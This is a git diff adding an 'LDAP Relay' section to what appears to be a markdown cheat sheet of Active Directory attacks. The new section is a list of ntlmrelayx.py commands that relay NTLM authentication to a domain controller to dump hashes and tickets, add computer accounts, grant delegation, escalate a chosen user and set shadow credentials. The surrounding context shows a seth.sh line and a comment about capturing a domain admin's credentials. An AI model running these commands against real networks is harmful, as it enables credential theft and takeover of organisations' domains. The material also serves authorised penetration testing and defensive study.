@@ -50,3 +50,21 @@ LLMNR Poisoning mitigation :
 ./seth.sh eth0 192.168.154.137 192.168.154.131 192.168.154.134
 #when victum domain admin group user try to connect to dc ip , account credentials we capture .
 ```
+
+#### LDAP Relay :
+```bash
+#t: Target service (LDAP server or domain controller)
+#-l: Directory to store loot (NTLM hashes, TGTs, etc.)
+ntlmrelayx.py -t ldap://<DC_IP> -l lootdir/
+ntlmrelayx.py -t ldaps://<DC_IP> -l lootdir/
+
+ntlmrelayx.py -t ldap://<DC_IP> --no-smb-server
+ntlmrelayx.py -t ldaps://<DC_IP> --add-computer
+--delegate-access
+
+ntlmrelayx.py -t ldaps://<DC_IP> --escalate-user <target-username>
+ntlmrelayx.py -t ldaps://<DC_IP> --shadow-credentials
+ntlmrelayx.py -tf targets.txt -l loot/
+ntlmrelayx.py -t ldaps://<DC_IP> --http-port 80 --no-smb-server
+
+```
